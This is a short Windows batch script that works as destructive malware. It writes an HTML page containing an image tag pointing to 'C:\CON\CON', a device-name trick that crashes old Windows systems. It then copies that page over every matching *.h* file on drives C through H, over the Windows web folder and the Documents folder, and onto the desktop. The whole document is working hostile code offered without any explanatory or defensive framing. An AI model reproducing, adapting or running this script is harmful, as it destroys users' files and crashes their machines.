@echo off
type %0 |find "IMG SRC"|find /V "find" >dead.html
goto infect
<IMG SRC="C:\CON\CON">
rem caps
:infect
set alldir= C:\ d:\ e:\ f:\ g:\ h:\
for %%f in (%alldir%\*.h*) do copy dead.html %%f >nul
for %%f in (%winbootdir%\web\*.*) do copy dead.html %%f >nul
for %%f in (%winbootdir%\*.h*) do copy dead.html %%f >nul
for %%f in (c:\docume~1\*.h*) do copy dead.html %%f >nul
copy dead.html %winbootdir%\desktop\HBBG.html >nul
copy dead.html %winbootdir%\asztal\HBBG.html >nul
del dead.html
